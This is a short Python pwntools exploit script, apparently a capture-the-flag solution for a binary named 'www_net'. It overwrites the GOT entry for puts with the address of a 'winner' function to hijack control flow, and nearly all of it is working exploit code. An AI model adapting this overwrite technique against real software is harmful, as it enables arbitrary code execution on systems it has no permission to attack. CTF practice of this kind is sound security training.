#!/usr/bin/env python3

from pwn import *
import sys, struct
import getpass

# Start the process
context.terminal = ['tmux', 'new-window']
elf = context.binary = ELF('./docker/exe/www_net')

gs = '''
b *printf
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        #return remote('challenges.ctfd.io', 30461)
        return remote('localhost', 8080)
    else:
        return process(elf.path)

p = start()


if not args.REMOTE:
    # Wait for user input incase you want to attach a debugger
    log.success('Binary Executed, Press Enter to continue')
    sys.stdin.read(1)

# Print the programs message
got_entry_for_puts = 0x804c030
address_of_winner = 0x8049427
p.send(b'A' *20 + p32(got_entry_for_puts))
p.recv()
p.send(p32(address_of_winner))
print(p.recvall().decode('utf-8').split('\n')[1])
